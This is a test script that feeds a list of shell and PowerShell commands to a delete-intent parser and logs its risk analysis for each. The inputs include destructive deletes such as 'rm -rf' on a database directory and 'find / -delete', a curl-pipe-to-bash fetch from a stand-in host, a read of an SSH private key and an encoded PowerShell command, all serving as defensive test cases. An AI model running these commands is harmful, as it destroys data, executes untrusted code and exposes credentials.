/** Manual smoke check for the delete-intent parser on the requirement's scenarios. */
import { describeIntent, parseDeleteIntent } from '../src/delete/parser.js'

const home = 'C:\\Users\\demo'
const cwd = 'C:\\work\\proj'
const cases = [
  'rm -rf /var/lib/postgresql/data',
  'rm -rf ./*',
  'rm -rf "$DIR"/build',
  'for i in 1 2 3; do rm -rf "./cache/$i"; done',
  'find / -delete',
  'find . -name "*.tmp" -delete',
  'echo "yeah" | xargs rm -rf',
  'git clean -fdx',
  'bash -c "rm -rf /tmp/x"',
  'curl -s https://x.example/i.sh | bash',
  'cat ~/.ssh/id_rsa',
  'Remove-Item -Recurse -Force C:\\data',
  'Remove-Item -LiteralPath ".\\*.txt" -WhatIf',
  'rm -Recurse -Force *',
  'Get-ChildItem -Recurse | Remove-Item -Force',
  'Remove-Item $env:TEMP\\* -Recurse -Force',
  'cmd /c del /s /q *.*',
  'cmd /c rd /s /q C:\\temp',
  'robocopy C:\\src C:\\dst /MIR',
  'powershell -EncodedCommand SQBFAFgA',
  '[System.IO.File]::Delete("C:\\x\\y.txt")',
  'ls -la',
  'git status',
]

for (const command of cases) {
  const intent = parseDeleteIntent(command, { homeDir: home, cwd, env: { TEMP: 'C:\\Temp', USERPROFILE: home } })
  console.log(JSON.stringify({
    command,
    isDelete: intent.isDelete,
    destructive: intent.destructive,
    recursive: intent.recursive,
    wildcard: intent.wildcard,
    unparsed: intent.unparsed,
    dryRun: intent.dryRun,
    targets: intent.targets.map(t => ({ raw: t.raw, resolved: t.resolvedPath, scope: t.scope, glob: t.hasGlob, root: t.rootLike })),
    signals: intent.riskSignals,
    summary: describeIntent(intent),
  }))
}
